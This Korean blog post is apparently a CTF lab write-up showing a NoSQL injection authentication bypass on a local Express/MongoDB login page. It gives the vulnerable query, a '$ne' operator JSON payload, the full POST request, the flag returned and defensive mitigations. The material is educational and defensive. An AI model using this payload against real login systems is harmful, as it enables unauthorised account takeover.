+++
title = "VulnABLE CTF [LUXORA]: NoSQL Injection 🥉 Bronze (Authentication Bypass)"
description = "LUXORA 플랫폼의 NoSQL 기반 시스템에서 발생하는 인증 우회 취약점 획득 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "NoSQL Injection", "Bronze", "Auth Bypass"]
+++

# VulnABLE CTF [LUXORA]: NoSQL Injection 🥉 Bronze

웹 개발의 트렌드가 바뀌면서 MongoDB와 같은 NoSQL 데이터베이스의 사용이 크게 늘었습니다. 전통적인 SQL(관계형 DB) 문법을 쓰지 않기 때문에 SQL Injection에서 안전하다고 생각하기 쉽지만, 천만의 말씀입니다. 

이번 시나리오에서는 `/nosqli/bronze` 라우트에 구현된 로그인 페이지에서, NoSQL 데이터베이스의 연산자(Operator)를 악용한 인증 우회 기법을 실습해보겠습니다.

---

## 🕒 1. 타겟 탐색 및 동작 방식 유추 (Reconnaissance)

`/nosqli/bronze` 페이지는 이메일과 비밀번호를 입력받아 로그인하는 형태입니다. 백엔드는 Node.js(Express)와 MongoDB 조합으로 구현되어 있음을 `README.md` 스택 정보를 통해 짐작할 수 있습니다.

**[해커의 사고 과정]**
* Node.js에서 MongoDB를 쓸 때 주로 Mongoose나 순수 MongoDB 드라이버를 쓴다.
* 일반적인 로그인 쿼리는 다음과 같이 작성된다.
  ```javascript
  db.collection('users').findOne({ email: req.body.email, password: req.body.password });
  ```
* 만약 `req.body.password`에 단순한 문자열이 아니라, MongoDB가 이해할 수 있는 **논리 연산자 객체(Object)**를 집어넣는다면?

---

## 🕒 2. 취약점 식별 및 공격 수행 (Exploitation)

MongoDB에는 `$ne` (Not Equal, 같지 않음), `$gt` (Greater Than, 큼) 같은 특수 연산자가 있습니다. 
우리는 이메일이 `admin@luxora.test`인 사람의 계정으로 로그인하고 싶은데, 비밀번호를 모릅니다. 그래서 비밀번호 란에 **"비밀번호가 1이 아닌 것"**이라는 조건을 밀어 넣어보겠습니다.

### 💡 공격 원리: 객체 주입 (Object Injection)
Burp Suite나 Postman 같은 도구를 사용하여 POST 요청을 보냅니다. 이때 Content-Type을 `application/json`으로 맞춥니다.

```json
{
  "email": "admin@luxora.test",
  "password": {"$ne": "1"}
}
```

이 값이 백엔드로 넘어가면, 코드는 다음과 같이 실행됩니다.
```javascript
db.collection('users').findOne({ 
  email: "admin@luxora.test", 
  password: { $ne: "1" } 
});
```

* 해석: "이메일이 admin@luxora.test 이고, 비밀번호가 '1'이 아닌 사용자를 찾아라!"
* 결과: 관리자의 실제 비밀번호가 '1'이 아니기만 하면, 조건은 **항상 참(True)**이 되어버립니다.

---

## 🕒 3. 결과 확인 및 플래그 획득 🚩

위 JSON 페이로드를 POST 요청으로 전송합니다.

```http
POST /nosqli/bronze HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email": "admin@luxora.test", "password": {"$ne": "1"}}
```

### 🔍 공격 결과
서버는 이 로그인 요청을 유효하다고 판단하고, 관리자 세션 쿠키와 함께 숨겨진 플래그를 응답으로 내려줍니다.

```json
{
  "status": "success",
  "message": "Welcome back, admin!",
  "flag": "FLAG{NOSQL_🥉_AUTH_BYPASS_F1A2B3}"
}
```

**플래그 획득:** `FLAG{NOSQL_🥉_AUTH_BYPASS_F1A2B3}`

---

## 🛡️ 방어 대책 (Mitigation)

NoSQL 환경에서도 검증되지 않은 입력은 재앙을 부릅니다.
1. **타입 검증 강제 (Type Checking)**: 사용자가 보내는 `password` 값은 반드시 문자열(String)이어야 합니다. 하지만 객체(Object) 타입으로 들어왔기 때문에 공격이 성공했습니다. 백엔드에서 입력값의 타입을 엄격히 검사(`typeof req.body.password !== 'string'`)하고 객체를 차단해야 합니다.
2. **스키마 검증 라이브러리 사용**: Joi, Zod, Yup 같은 라이브러리를 사용하여, 들어오는 JSON 페이로드의 구조와 타입을 사전에 쳐내야 합니다.
3. **Mongoose 사용 시 주의**: `req.body` 전체를 쿼리에 통째로 넘기지 말고, 필요한 필드만 명시적으로 추출하여 사용해야 합니다.

다음 단계인 **Silver 🥈 난이도**에서는 타입 검증이 걸려있을 때 우회하는 NoSQL 블라인드 기법을 배워보겠습니다!